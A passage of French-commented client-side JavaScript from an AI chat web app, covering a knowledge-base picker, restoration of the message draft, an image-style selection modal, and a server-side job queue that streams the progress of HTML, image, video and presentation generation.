        catch (_) {}
    };
    // `kb_draft` dit au serveur que le brouillon a voyagé — même vide. Sans
    // lui, create() pose les bases cochées par défaut.
    window.kbDraftAppend = (fd) => {
        fd.append('kb_draft', '1');
        readDraft().forEach(id => fd.append('kb_ids[]', String(id)));
    };
    window.kbDraftClear  = () => { clearDraft(); };

    // ---- Rendu : SEUL endroit qui écrit dans le DOM ----
    const esc = (texte) => { const d = document.createElement('div'); d.textContent = texte; return d.innerHTML; };

    function renderLockedRows() {
        // On purge TOUTES les lignes verrouillées, y compris celles rendues par
        // le serveur : sans quoi le premier render() empilerait ses propres
        // lignes par-dessus et l'assistant apparaîtrait deux fois. Le serveur
        // les rend pour le premier affichage (et sans JavaScript) ; passé
        // l'amorçage, `profileKb` en est la seule source — il change à chaque
        // conversation, le DOM initial non.
        list.querySelectorAll('.kb-picker-row[data-locked="1"]').forEach(el => el.remove());
        const first = list.querySelector('.picker-section-label');
        // Insérées en tête, comme au rendu serveur : ces bases sont imposées,
        // elles se lisent avant celles qu'on peut cocher.
        let after = first;
        profileKb.forEach(kb => {
            const li = document.createElement('li');
            li.className = 'kb-picker-row is-locked';
            li.dataset.kbId    = String(kb.id);
            li.dataset.locked  = '1';
            li.dataset.disabled = '1';
            li.dataset.injected = '1';
            li.dataset.name    = String(kb.name || '').toLowerCase();
            li.title = t("Base de l'assistant : toujours interrogée, elle ne se retire pas ici.");
            li.innerHTML =
                '<label class="kb-picker-label"><input type="checkbox" checked disabled>' +
                '<span class="kb-picker-meta"><span class="kb-picker-name">' + esc(String(kb.name || '')) + '</span>' +
                '<span class="kb-picker-sub">Fournie par l\'assistant</span></span></label>' +
                '<span class="kb-picker-badge kb-picker-badge-lock">Assistant</span>';
            after.insertAdjacentElement('afterend', li);
            after = li;
        });
        // Une base devenue « de l'assistant » ne doit plus figurer en double
        // dans la liste cochable (l'admin a pu la rattacher entre-temps).
        const locked = new Set(profileKb.map(k => Number(k.id)));
        list.querySelectorAll('.kb-picker-row[data-locked="0"]').forEach(row => {
            row.hidden = locked.has(Number(row.dataset.kbId));
        });
    }

    function render() {
        renderLockedRows();
        const atMax = selected.length >= MAX;

        list.querySelectorAll('.kb-picker-row[data-locked="0"]').forEach(row => {
            const id    = Number(row.dataset.kbId);
            const input = row.querySelector('input[type="checkbox"]');
            const off   = row.dataset.disabled === '1';
            const on    = selected.includes(id);
            if (input) input.checked = on;
            // Plafond atteint : seules les lignes NON cochées se ferment — on
            // doit toujours pouvoir décocher pour faire de la place.
            const capped = atMax && !on && !off;
            row.classList.toggle('is-capped', capped);
            if (input && !off) input.disabled = capped;
        });

        if (count) {
            // La pastille ne compte QUE les bases de l'utilisateur : la pastille
            // d'un contrôle reflète ce que ce contrôle change. Celles de
            // l'assistant sont déjà signalées par le badge « RAG ».
            count.hidden = selected.length === 0;
            count.textContent = String(selected.length);
        }
        btn.title = t('Bases de connaissances')
            + (selected.length ? ' — ' + selected.length + ' choisie' + (selected.length > 1 ? 's' : '') : '')
            + (profileKb.length ? ', ' + profileKb.length + ' de l\'assistant' : '');

        if (hint) {
            hint.classList.toggle('is-reached', atMax);
            hint.textContent = atMax
                ? MAX + t(' bases maximum — décochez-en une pour en ajouter')
                : MAX + t(' bases maximum');
        }
    }

    // ---- Enregistrement ----
    // Immédiat, sans débounce : un délai laisserait envoyer un message avant que
    // l'écriture ne parte, et c'est précisément la course qui compte ici. Le
    // double-clic est couvert par la garde de séquence, pas par un délai.
    async function commit(nextIds) {
        const cid = convId();
        if (!cid) {                       // conversation pas encore créée
            selected = nextIds;
            writeDraft(nextIds);
            render();
            return;
        }
        const seq = ++reqSeq;
        panel.classList.add('is-saving');
        try {
            const fd = new FormData();
            nextIds.forEach(id => fd.append('kb_ids[]', String(id)));
            const res  = await fetchWithSessionGuard(`/chat/${cid}/knowledge-bases`, {
                method: 'POST', headers: { 'X-CSRF-Token': csrfToken }, body: fd,
            });
            const data = await res.json().catch(() => ({}));
            if (seq !== reqSeq) return;   // une bascule plus récente a gagné
            if (!res.ok || !data.ok) {
                showToast(data.error || t('Enregistrement impossible'), 'error');
                render();
                return;
            }
            // La VÉRITÉ vient du serveur, jamais de l'optimisme du clic.
            selected = (data.kb_ids || []).map(Number);
            render();
            if (data.capped) showToast(t('{n} bases maximum par conversation.', { n: data.max || MAX }), 'info');
            else if ((data.rejected || []).length) {
                showToast(t("Une base n'a pas pu être ajoutée : déjà fournie par l'assistant, ou plus accessible."), 'info');
            }
        } catch (err) {
            if (err instanceof Error && err.message === 'SESSION_EXPIRED') return;
            if (seq === reqSeq) { showToast(t('Enregistrement impossible'), 'error'); render(); }
        } finally {
            if (seq === reqSeq) panel.classList.remove('is-saving');
        }
    }

    list.addEventListener('change', e => {
        const input = e.target;
        if (!input || input.type !== 'checkbox') return;
        const row = input.closest('.kb-picker-row');
        if (!row || row.dataset.locked === '1' || row.dataset.disabled === '1') return;

        const id      = Number(row.dataset.kbId);
        const wantOn  = !selected.includes(id);
        const nextIds = wantOn ? selected.concat([id]) : selected.filter(x => x !== id);
        // La case native s'est cochée d'elle-même : on la remet AUSSITÔT à
        // l'état connu, l'écran ne montre donc jamais un choix non enregistré.
        render();
        commit(nextIds);
    });

    // ---- Changement de conversation (charge déjà présente dans /chat/{id}/json) ----
    window.syncKbForConversation = (payload) => {
        selected  = (payload?.selected || []).map(Number);
        profileKb = payload?.profile  || [];
        render();
    };

    // Départ. Sans conversation, l'état vient du brouillon (l'utilisateur a pu
    // cocher puis recharger l'accueil) — restreint aux bases réellement
    // présentes et cochables, une base supprimée entre-temps ne doit pas rester
    // en attente d'être envoyée à la création. Avec une conversation, le serveur
    // a déjà tout rendu et le brouillon n'a plus de sens : on le purge, sinon il
    // ressurgirait à la prochaine conversation créée.
    if (!convId()) {
        const cochables = new Set(
            Array.from(list.querySelectorAll('.kb-picker-row[data-locked="0"][data-disabled="0"]'))
                 .map(row => Number(row.dataset.kbId))
        );
        // Pas encore de brouillon : on part des bases cochées par défaut pour
        // les groupes du compte (décochables comme les autres).
        const draft = readDraftRaw();
        const start = draft === null ? (CFG.defaults || []).map(Number) : draft;
        selected = start.filter(id => cochables.has(id)).slice(0, MAX);
        writeDraft(selected);
    } else {
        clearDraft();
    }
    render();
})();

// ---- Restauration du brouillon après ouverture d'un assistant ----
(function () {
    let draft = null;
    try {
        draft = sessionStorage.getItem('composerDraft');
        if (draft !== null) sessionStorage.removeItem('composerDraft');
    } catch (_) {}
    if (draft && msgInput && msgInput.value.trim() === '') {
        msgInput.value = draft;
        msgInput.dispatchEvent(new Event('input'));
        msgInput.focus();
        try { msgInput.selectionStart = msgInput.selectionEnd = msgInput.value.length; } catch (_) {}
    }
})();

// =========================================================
// GÉNÉRATION DE PAGE HTML
// =========================================================
let currentHtmlContent = '';
let currentHtmlMsgId   = null;
let currentHtmlPreviewUrl = null;
let htmlEditMode = false;            // mode « Éditer » de l'aperçu HTML
let htmlImagePickerMode = 'insert';  // insertion demandée par l'éditeur : insert | replace
let htmlSaveStateTimer = null;
let currentVideoUrl    = '';
let currentVideoMsgId  = null;
let currentVideoMeta   = null;
let currentVideoFilename = 'video.mp4';
let currentSourceItems = [];
let currentSourceSelectedUrl = '';
let currentSourceSelectedIndex = null;

// Sélecteur de l'outil image pour « Site illustré » (choix utilisateur au chat).
// Les outils dont le fournisseur n'a pas de clé API enregistrée sont grisés/désactivés.
// Défaut = outil image de la config admin si présent et branché, sinon 1er branché.
function promptIllustratedImageTool(htmlTool) {
    return new Promise(resolve => {
        const esc = s => String(s == null ? '' : s).replace(/[&<>"']/g, c => ({ '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;' }[c]));
        const tools = (window.IMAGE_TOOLS || []);

        let defaultId = '';
        let defaultStyle = ''; // style par défaut configuré en admin (directive)
        try {
            const full = htmlToolsMap.get(String(htmlTool.id));
            const cfg = full && full.config_json ? JSON.parse(full.config_json) : {};
            if (cfg.image_tool_id) defaultId = String(cfg.image_tool_id);
            if (cfg.image_style) defaultStyle = String(cfg.image_style);
        } catch (_) {}
        const connected = tools.filter(outil => outil.connected);
        // Utilisables : branchés ET en service. `retired` porte la raison
        // (traduite côté serveur) quand le modèle est arrêté par son fournisseur.
        const usable = connected.filter(outil => !outil.retired);
        if (!defaultId || !usable.some(outil => String(outil.id) === defaultId)) {
            defaultId = usable.length ? String(usable[0].id) : '';
        }

        const rowsHtml = tools.length
            ? tools.map(outil => {
                const id = String(outil.id);
                const ok = outil.connected && !outil.retired;
                const sub = outil.retired
                    ? esc(outil.retired)
                    : (outil.connected ? `${esc(outil.provider)} · ${esc(outil.model)}` : t('pas de clé API enregistrée'));
                return `<label class="illus-tool-row${ok ? '' : ' is-disabled'}">
                    <input type="radio" name="illus_image_tool" value="${id}" ${id === defaultId ? 'checked' : ''} ${ok ? '' : 'disabled'}>
                    <span class="illus-tool-meta">
                        <span class="illus-tool-name">🖼 ${esc(outil.name)}</span>
                        <span class="illus-tool-sub">${sub}</span>
                    </span>
                </label>`;
            }).join('')
            : `<p class="illus-modal-note">Aucun outil image disponible. La page sera générée avec des visuels de remplacement.</p>`;

        const noneConnected = tools.length > 0 && connected.length === 0;

        // Styles graphiques : SOURCE UNIQUE = window.IMAGE_STYLES (config/tools_catalog.php).
        // {key,label,directive} ; la directive est ajoutée au prompt image côté serveur.
        const STYLES = (window.IMAGE_STYLES || []);
        // Le style par défaut de l'assistant (configuré en admin) est pré-sélectionné :
        // preset si la directive correspond, « Libre » si texte personnalisé, sinon « Aucun ».
        const stylePreset   = STYLES.find(s => s.directive === defaultStyle);
        const styleIsCustom = defaultStyle !== '' && !stylePreset;
        const selectedStyleKey = stylePreset ? stylePreset.key : (styleIsCustom ? 'free' : 'none');
        const currentStyleLabel = stylePreset ? stylePreset.label
            : (styleIsCustom ? t('Personnalisé') : t('Au choix de l\'IA'));
        // Puces masquées par défaut (divulgation progressive) : « Aucun » + presets + « Libre ».
        const styleChips = `
            <label class="illus-style-chip">
                <input type="radio" name="illus_style" value="none" ${selectedStyleKey === 'none' ? 'checked' : ''}>Aucun
            </label>`
            + STYLES.map(s => `
            <label class="illus-style-chip">
                <input type="radio" name="illus_style" value="${esc(s.key)}" ${s.key === selectedStyleKey ? 'checked' : ''}>${esc(s.label)}
            </label>`).join('')
            + `<label class="illus-style-chip">
                <input type="radio" name="illus_style" value="free" ${selectedStyleKey === 'free' ? 'checked' : ''}>Libre…
            </label>`;

        const overlay = document.createElement('div');
        overlay.className = 'modal';
        overlay.style.zIndex = '500';
        overlay.innerHTML = `
            <div class="illus-modal-box" role="dialog" aria-modal="true">
                <h3>Images du site</h3>
                <p class="illus-modal-sub">Générateur d'images :</p>
                <div class="illus-tool-list">${rowsHtml}</div>
                ${noneConnected ? '<p class="illus-modal-note">' + escHtml(t("Aucun générateur n'a de clé API enregistrée — la page utilisera des visuels de remplacement.")) + '</p>' : ''}
                <p class="illus-modal-sub">Style des images : <strong class="illus-style-current">${esc(currentStyleLabel)}</strong>
                    <button type="button" id="illusStyleToggle" class="illus-style-toggle">changer</button></p>
                <div class="illus-style-chips" id="illusStyleChips" style="display:none">${styleChips}</div>
                <input type="text" id="illusStyleFree" class="illus-style-free" value="${styleIsCustom ? esc(defaultStyle) : ''}" placeholder="Décris le style voulu (ex. aquarelle pastel, rétro années 80…)" maxlength="200" style="display:none">
                <div class="illus-modal-actions">
                    <button type="button" class="illus-btn-cancel" data-act="cancel">Annuler</button>
                    <button type="button" class="btn-primary" data-act="ok">Générer le site</button>
                </div>
            </div>`;

        const freeInput     = overlay.querySelector('#illusStyleFree');
        const styleChipsEl  = overlay.querySelector('#illusStyleChips');
        const styleToggleEl = overlay.querySelector('#illusStyleToggle');
        const chipsOpen = () => styleChipsEl.style.display !== 'none';
        const syncFree = () => {
            const isFree = overlay.querySelector('input[name="illus_style"]:checked')?.value === 'free';
            freeInput.style.display = (chipsOpen() && isFree) ? '' : 'none';
            if (chipsOpen() && isFree) freeInput.focus();
        };
        // Divulgation progressive : par défaut on génère avec le style de l'assistant ;
        // « changer » déplie les puces pour dévier ponctuellement.
        styleToggleEl.addEventListener('click', () => {
            const open = !chipsOpen();
            styleChipsEl.style.display = open ? '' : 'none';
            styleToggleEl.textContent = open ? 'replier' : 'changer';
            syncFree();
        });
        overlay.querySelectorAll('input[name="illus_style"]').forEach(r => r.addEventListener('change', syncFree));

        // « Aucun » (et un texte libre vide) renvoient le sentinel __none__ : côté serveur il
        // force « pas de style » et écrase le défaut admin (une valeur vide y retomberait dessus).
        const resolveStyle = () => {
            const sel = overlay.querySelector('input[name="illus_style"]:checked');
            if (!sel || sel.value === 'none') return '__none__';
            if (sel.value === 'free') return freeInput.value.trim() || '__none__';
            return (STYLES.find(s => s.key === sel.value) || {}).directive || '__none__';
        };

        const onKey = (e) => { if (e.key === 'Escape') close(null); };
        const close = (result) => { overlay.remove(); document.removeEventListener('keydown', onKey); resolve(result); };
        overlay.addEventListener('mousedown', (e) => { if (e.target === overlay) close(null); });
        overlay.querySelector('[data-act="cancel"]').addEventListener('click', () => close(null));
        overlay.querySelector('[data-act="ok"]').addEventListener('click', () => {
            const sel = overlay.querySelector('input[name="illus_image_tool"]:checked');
            close({ imageToolId: sel ? sel.value : null, style: resolveStyle() });
        });
        document.addEventListener('keydown', onKey);
        document.body.appendChild(overlay);
        overlay.querySelector('[data-act="ok"]').focus();
    });
}

// ---- Générations asynchrones (file de jobs) ----
// Un job vit CÔTÉ SERVEUR : changer de conversation, changer de page ou
// recharger n'interrompt plus rien. Le client s'y (ré)attache par EventSource,
// qui gère seul la reconnexion et le curseur (en-tête Last-Event-ID).
// (la map `activeJobs` est déclarée en tête de fichier, avec activeStreams)

// Comportements propres à chaque type de génération. Le socle (flux, erreurs,
// annulation, restauration) est commun ; seul le rendu diffère.
// type → { statusLabel(state), onEvent(state, json), onDone(state, json),
//          onRestore(state), onFail(state) }
const JOB_TYPES = {};
window.JOB_TYPES = JOB_TYPES;

function jobIsVisible(state) {
    return String(state.convId) === String(visibleConvId);
}

/** Le résultat arrive-t-il hors de la vue de l'utilisateur ? */
function jobNeedsNotification(cid) {
    return document.hidden || String(cid) !== String(visibleConvId);
}

/** Réveille le tiroir des générations (il poll sinon toutes les 10 s). */
function signalJobsChanged() {
    try { window.dispatchEvent(new Event('mia-jobs-changed')); } catch (_e) {}
}

function jobStatusLabel(state) {
    const type = JOB_TYPES[state.type];
    return (type && type.statusLabel) ? type.statusLabel(state) : t('Génération en cours…');
}

/** Texte d'attente dans la bulle assistant (jamais de HTML injecté). */
function setJobStatus(el, label) {
    if (!el) return;
    // Le bandeau de phase générique ferait doublon avec ce libellé
    // (« Analyse de votre demande… » + « Construction de la présentation… »).
    el.querySelector('.stream-phase')?.remove();
    const md = el.querySelector('.md-render');
    if (!md) return;
    md.innerHTML = '<span style="color:var(--text-muted);font-style:italic;font-size:13px"></span>';
    md.firstChild.textContent = label;
}

/** Titre lisible d'une conversation (toasts d'arrière-plan). */
function convTitleFor(cid) {
    const item = document.querySelector(`.conv-item[data-id="${String(cid)}"] .conv-title`)
              || document.querySelector(`.conv-item[data-id="${String(cid)}"]`);
    return (item?.textContent || '').trim() || t('une autre conversation');
}

/**
 * Ouvre (ou réutilise) le flux d'un job. Idempotent : appelé au lancement, au
 * retour sur la conversation et au chargement de la page.
 */
function attachJob(jobId, opts = {}) {
    const key = String(jobId);
    const existing = activeJobs.get(key);
    if (existing) {
        if (opts.el) existing.el = opts.el;
        return existing;
    }

    const state = {
        id: key,
        type: String(opts.type || 'html'),
        convId: String(opts.convId || ''),
        el: opts.el || null,
        data: opts.data || {},
        errorPayload: null,
        done: false,
        errors: 0,
        es: null,
    };
    activeJobs.set(key, state);

    const es = new EventSource(`/jobs/${key}/stream`);
    state.es = es;
    es.onmessage = (ev) => { state.errors = 0; handleJobEvent(state, ev.data); };
    es.onerror = () => {
        // EventSource se reconnecte tout seul (retry + Last-Event-ID) : on ne
        // ferme QUE si le job est déjà terminé, sinon on perdrait la fin du flux.
        if (state.done) { closeJob(state); return; }
        // Session expirée ou route injoignable : sans garde, EventSource
        // retenterait indéfiniment en silence. La génération, elle, continue
        // côté serveur — un rechargement la retrouvera.
        state.errors += 1;
        if (state.errors >= 6) {
            failJob(state, {
                kind: 'generic',
                title: t('Suivi interrompu'),
                message: t('Le suivi de la génération a été perdu. Rechargez la page pour le reprendre — elle continue côté serveur.'),
            });
        }
    };
    refreshSendStopUi();
    signalJobsChanged();
    return state;
}

function handleJobEvent(state, raw) {
    let json;
    try { json = JSON.parse(raw); } catch (_p) { return; }
    const type = JOB_TYPES[state.type] || {};

    if (json.quota_exceeded) {
        state.done = true;
        if (jobIsVisible(state)) {
            if (type.onFail) type.onFail(state);
            state.el?.closest('.message')?.remove();
        }
        handleQuotaExceededPayload(json);
        return;
    }

    if (json.llm_error) {
        state.errorPayload = json.llm_error;
        if (jobIsVisible(state)) {
            if (type.onFail) type.onFail(state);
            if (state.el) renderInlineError(state.el, json.llm_error);
        } else {
            showToast(t('Génération interrompue dans « ') + convTitleFor(state.convId) + ' »', 'error');
        }
        return;
    }

    if (json.job_end) {
        closeJob(state);
        return;
    }

    if (json.done) {
        state.done = true;
        applyQuotaStatus(json.quota_status || null);
        if (jobIsVisible(state)) {
            applyConversationCreditsTotal(json.conversation_credits_total || 0);
        }
        if (type.onDone) type.onDone(state, json);
        // Création finie (image, page web…) : la suite proposée la vise.
        if (jobIsVisible(state)) syncComposerSuggestion();
        return;
    }

    if (type.onEvent) type.onEvent(state, json);
}

/** Échec côté client (flux perdu) : la génération continue côté serveur. */
function failJob(state, payload) {
    state.errorPayload = payload;
    const type = JOB_TYPES[state.type] || {};
    if (jobIsVisible(state)) {
        if (type.onFail) type.onFail(state);
        if (state.el) renderInlineError(state.el, payload);
    }
    closeJob(state);
}

function closeJob(state) {
    state.done = true;
    try { state.es?.close(); } catch (_e) {}
    activeJobs.delete(state.id);
    signalJobsChanged();
    if (jobIsVisible(state)) {
        sendBtn.disabled = msgInput.value.trim() === '' && pendingFiles.length === 0;
    }
    refreshSendStopUi();
}

/**
 * Retour sur une conversation dont un job tourne encore : on recrée le
 * placeholder et on rebranche l'affichage. Le flux, lui, n'a jamais été coupé.
 */
function restoreJobPlaceholders(cidStr) {
    activeJobs.forEach((state) => {
        if (state.done || String(state.convId) !== String(cidStr)) return;
        const type = JOB_TYPES[state.type] || {};
        // Un type peut refuser la bulle d'attente (la présentation a son volet).
        if (type.noBubble !== true) {
            state.el = appendMessage('assistant', '', [], true);
            setJobStatus(state.el, jobStatusLabel(state));
            if (state.errorPayload) {
                renderInlineError(state.el, state.errorPayload);
                return;
            }
        }
        if (type.onRestore) type.onRestore(state);
        if (type.passive !== true) sendBtn.disabled = true;
    });
}

/**
 * Démarre une génération : enfile le job côté serveur puis s'attache à son
 * flux. Renvoie l'état du job, ou null si l'enfilage a échoué (l'erreur est
 * alors déjà rendue dans la bulle).
 */
async function startJob(url, formData, opts) {
    const { type, convId: cid, el, onQuota, onError, data } = opts;
    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'X-CSRF-Token': csrfToken },
            body: formData,
        });
        const payload = await response.json().catch(() => ({}));

        if (!response.ok) {
            if (response.status === 429 && handleQuotaExceededPayload(payload)) {
                if (onQuota) onQuota();
                return null;
            }
            throw new Error(payload.error || t('Erreur serveur ({code})', { code: response.status }));
        }
        if (!payload.job_id) throw new Error(t('La tâche de génération n\'a pas pu être créée.'));

        // Job accepté : le prompt est persisté côté serveur, brouillon purgé
        // (même point unique pour image / HTML / vidéo / carte).
        clearComposerDraft();
        return attachJob(payload.job_id, { type, convId: cid, el, data: { ...(data || {}), ...payload } });
    } catch (err) {
        if (onError) onError(err);
        return null;
    }
}

// ---- Type « html » : page HTML / site illustré ----
JOB_TYPES.html = {
    statusLabel: (state) => state.data.imgTotal
        ? t('🖼 Génération des images (') + state.data.imgDone + '/' + state.data.imgTotal + ')…'
        : t('🌐 Génération de la page HTML en cours…'),

    onEvent(state, json) {
        if (json.chunk) {
            state.data.rawHtml = (state.data.rawHtml || '') + json.chunk;
            if (jobIsVisible(state)) {
                if (!state.data.codeShown) { showHtmlViewerCode(''); state.data.codeShown = true; }
                const pre = document.getElementById('htmlViewerCodePre');
                if (pre) {
                    pre.textContent = state.data.rawHtml;
                    pre.parentElement.scrollTop = pre.parentElement.scrollHeight;
                }
            }
        }
        if (json.image_progress) {
            state.data.imgDone  = json.image_progress.done  || 0;
            state.data.imgTotal = json.image_progress.total || 0;
            if (jobIsVisible(state)) setJobStatus(state.el, jobStatusLabel(state));
        }
    },

    onDone(state, json) { finishHtmlJob(state, json); },
    onFail(state) { if (jobIsVisible(state)) closeHtmlViewer(); },

    onRestore(state) {
        if (state.errorPayload) return;
        openHtmlViewer(null, null, true);
        if (state.data.rawHtml) {
            showHtmlViewerCode('');
            state.data.codeShown = true;
            const pre = document.getElementById('htmlViewerCodePre');
            if (pre) pre.textContent = state.data.rawHtml;
        }
    },
};

async function finishHtmlJob(state, json) {
    let cleanHtml = cleanHtmlCode(state.data.rawHtml || '');
    // Illustré : le flux ne contient que les placeholders ; le HTML stocké
    // porte les src d'images résolus.
    if ((json.illustrated || state.data.illustrated || !cleanHtml) && json.msg_id) {
        try {
            const savedRes = await fetch(`/chat/message/${json.msg_id}/html`, {
                headers: { 'X-CSRF-Token': csrfToken },
            });
            const savedData = await savedRes.json().catch(() => ({}));
            cleanHtml = cleanHtmlCode(savedData.html || '');
        } catch (e) {
            // Laisser cleanHtml tel quel : la vue code montrera l'état réel reçu.
        }
    }

    // Conversation quittée entre-temps : la page est bien produite et
    // persistée, on se contente de le signaler.
    if (jobNeedsNotification(state.convId)) {
        notifyJobDone(t('Votre page HTML est prête.'), state.convId);
    }
    if (!jobIsVisible(state)) {
        showToast(t('Page HTML prête dans « ') + convTitleFor(state.convId) + ' »', 'success');
        return;
    }

    currentHtmlMsgId   = json.msg_id || null;
    currentHtmlContent = cleanHtml;
    switchToHtmlPreview(cleanHtml);

    if (state.el) {
        const md = state.el.querySelector('.md-render');
        if (md) md.innerHTML = '';
        state.el.classList.remove('streaming');
        state.el.insertAdjacentHTML('beforebegin', buildHtmlCard(json.msg_id, cleanHtml.length));
    }

    // Itération : le résumé des ajustements est déjà persisté côté serveur —
    // on l'affiche en direct sous la carte de page.
    if (json.summary) {
        appendMessage('assistant', json.summary, [], false, { messageId: json.summary_msg_id || null });
    }

    // L'outil qui a produit la page reste engagé de lui-même (mémoire de
    // conversation) : chaque message suivant l'améliore. On ne le ré-arme donc
    // PAS ici — l'utilisateur a pu l'éteindre pendant la génération, et le
    // rétablir contre son geste serait une régression.
    scrollBottom();
}

// ---- Type « image » ----
JOB_TYPES.image = {
    statusLabel: () => t('🎨 Génération en cours… (15–30 s)'),

    onDone(state, json) {
        if (jobNeedsNotification(state.convId)) {
            notifyJobDone(t('Votre image est prête.'), state.convId);
        }
        if (!jobIsVisible(state)) {
            showToast(t('Image prête dans « ') + convTitleFor(state.convId) + ' »', 'success');
            return;
        }
        const el = state.el;
        if (!el) return;
        const md = el.querySelector('.md-render');
        let html = `<div class="msg-image-wrap msg-image-generated">
            <img class="msg-image" src="${escHtml(json.image_url || '')}" alt="Image générée" loading="lazy">`;
        if (json.revised_prompt) {
            html += `<div class="msg-image-name" title="${escHtml(json.revised_prompt)}">✨ ${escHtml(json.revised_prompt.length > 80 ? json.revised_prompt.slice(0, 80) + '…' : json.revised_prompt)}</div>`;
        }
        html += '</div>';
        if (md) md.innerHTML = html;
        el.classList.remove('streaming');
        el.querySelector('.stream-phase')?.remove();
        // Identifiant du NOUVEAU message : une régénération a supprimé l'ancien.
        if (json.msg_id) {
            el.dataset.messageId = String(json.msg_id);
            el.closest('.message')?.setAttribute('data-message-id', String(json.msg_id));
        }
        // data-raw = markdown pour copier / historique
        el.dataset.raw = json.content || '';
        // Images de référence transmises (« D'après « logo.png » ») : même
        // ligne de trace qu'au rechargement (message.php) et que dans le chat.
        if (Array.isArray(json.actions) && json.actions.length) {
            renderActionTrace(el.closest('.msg-body'), json.actions);
        }
        // Recalcule les boutons d'action (Copier / Télécharger l'image), sinon
        // ceux du placeholder texte restent affichés jusqu'au rechargement.
        refreshAssistantActions(el.closest('.message'));
        scrollBottom();
    },
};

// ---- Type « video » ----
JOB_TYPES.video = {
    statusLabel: () => t('🎬 Génération vidéo en cours…'),
    onFail(state) { if (jobIsVisible(state)) closeVideoViewer(); },
    onRestore(state) { if (!state.errorPayload) openVideoViewer(null, null, true, null); },

    onDone(state, json) {
        if (jobNeedsNotification(state.convId)) {
            notifyJobDone(t('Votre vidéo est prête.'), state.convId);
        }
        if (!jobIsVisible(state)) {
            showToast(t('Vidéo prête dans « ') + convTitleFor(state.convId) + ' »', 'success');
            return;
        }
        const metaText = buildVideoMetaText(json.meta || null);
        const filename = json.filename || 'video.mp4';
        openVideoViewer(json.video_url, json.msg_id || null, false, metaText, filename);

        const el = state.el;
        if (el) {
            const md = el.querySelector('.md-render');
            if (md) md.innerHTML = '';
            el.classList.remove('streaming');
            el.dataset.raw = json.content || '';
            el.insertAdjacentHTML('beforebegin', buildVideoCard(json.msg_id, json.video_url, metaText, filename));
        }
        scrollBottom();
    },
};

// ---- Type « gamma » (présentation gamma.app) ----
// Pas de bulle d'attente : le message « ⏳ … lancée » persisté par le serveur
// joue ce rôle, et le message final ✅ est lui aussi persisté — le job ne sert
// ici qu'à l'afficher en direct et à notifier hors de la vue.
JOB_TYPES.gamma = {
    noBubble: true,
    // Suivi passif : le composer reste utilisable pendant les 1–3 minutes de
    // génération (l'arrêt du suivi passe par le tiroir des générations).
    passive: true,
    statusLabel: () => t('📽 Présentation Gamma en cours… (1–3 min)'),

    onDone(state, json) {
        if (!json.cancelled && jobNeedsNotification(state.convId)) {
            notifyJobDone(t('Votre présentation Gamma est prête.'), state.convId);
        }
        if (!jobIsVisible(state)) {
            if (!json.cancelled) {
                showToast(t('Présentation prête dans « ') + convTitleFor(state.convId) + ' »', 'success');
            }
            return;
        }
        if (json.content) {
            appendMessage('assistant', json.content);
            scrollBottom();
        }
    },
};

// ---- Type « native_deck » (présentation ou classeur réalisés par le modèle) ----
// Même contrat que « gamma » : le message « ⏳ … » et le lien final sont
// persistés par le serveur, le job ne sert qu'à l'afficher en direct.
JOB_TYPES.native_deck = {
    noBubble: true,
    passive: true,
    statusLabel: () => t('✨ Le modèle réalise le fichier… (1–3 min)'),

    onDone(state, json) {
        if (!json.cancelled && jobNeedsNotification(state.convId)) {
            notifyJobDone(t('Votre fichier est prêt.'), state.convId);
        }
        if (!jobIsVisible(state)) {
            if (!json.cancelled) {
                showToast(t('Fichier prêt dans « ') + convTitleFor(state.convId) + ' »', 'success');
            }
            return;
        }
        if (json.content) {
            appendMessage('assistant', json.content);
            scrollBottom();
        }
    },
};

// ---- Type « mybrain_feed » (texte proposé au cerveau MyBrain) ----
// Même contrat que « gamma » : le message « ⏳ … transmis » et le message
// final sont persistés par le serveur, le job ne sert qu'à l'afficher en
// direct et à notifier hors de la vue.
JOB_TYPES.mybrain_feed = {
    noBubble: true,
    passive: true,
    statusLabel: () => t('🧠 Analyse par le cerveau MyBrain en cours…'),

    onDone(state, json) {
        if (!json.cancelled && jobNeedsNotification(state.convId)) {
            notifyJobDone(t('Le cerveau MyBrain a analysé votre texte.'), state.convId);
        }
        if (!jobIsVisible(state)) {
            if (!json.cancelled) {
                showToast(t('Texte analysé par MyBrain dans « ') + convTitleFor(state.convId) + ' »', 'success');
            }
            return;
        }
        if (json.content) {
            appendMessage('assistant', json.content);
            scrollBottom();
        }
    },
};

async function generateHtml(prompt, toolId, imageToolId = null, imageStyle = '') {
    if (!convId()) {
        if (!await createConversation()) return;
    }
    const cid = String(convId());

    appendMessage('user', prompt);
    msgInput.value = '';
    msgInput.style.height = 'auto';
    sendBtn.disabled = true;
    clearFiles();

    // Ouvre le viewer en mode loading
    openHtmlViewer(null, null, true);

    // Placeholder dans le chat
    const assistantEl = appendMessage('assistant', '', [], true);
    setJobStatus(assistantEl, t('🌐 Génération de la page HTML en cours…'));

    const fd = new FormData();
    fd.append('message', prompt);
    fd.append('tool_id', toolId);
    if (imageToolId) fd.append('image_tool_id', imageToolId);
    if (imageStyle) fd.append('image_style', imageStyle);

    // La requête n'attend plus la génération : elle enfile un job et rend la
    // main immédiatement.
    await startJob(`/chat/${cid}/generate-html`, fd, {
        type: 'html',
        convId: cid,
        el: assistantEl,
        // Retenu pour ré-armer exactement CET outil en fin de génération
        // (mode itération du composer).
        data: { toolId },
        onQuota: () => {
            assistantEl.closest('.message')?.remove();
            closeHtmlViewer();
            sendBtn.disabled = msgInput.value.trim() === '' && pendingFiles.length === 0;
        },
        onError: (err) => {
            closeHtmlViewer();
            renderInlineError(assistantEl, {
                kind: 'generic',
                title: t('Génération impossible'),
                message: err && err.message ? err.message : t('La page HTML n\'a pas pu être générée. Réessayez.'),
            });
            sendBtn.disabled = msgInput.value.trim() === '' && pendingFiles.length === 0;
        },
    });
}

async function generateVideo(prompt, toolId, videoOptions = null) {
    if (!convId()) {
        if (!await createConversation()) return;
    }
    const cid = String(convId());

    appendMessage('user', prompt);
    msgInput.value = '';
    msgInput.style.height = 'auto';
    sendBtn.disabled = true;
    clearFiles();

    openVideoViewer(null, null, true, null);

    const assistantEl = appendMessage('assistant', '', [], true);
    setJobStatus(assistantEl, t('🎬 Génération vidéo en cours…'));

    const fd = new FormData();
    fd.append('message', prompt);
    fd.append('tool_id', toolId);
    if (videoOptions && typeof videoOptions === 'object') {
        if (videoOptions.model)   fd.append('video_model', videoOptions.model);
        if (videoOptions.seconds) fd.append('video_seconds', videoOptions.seconds);
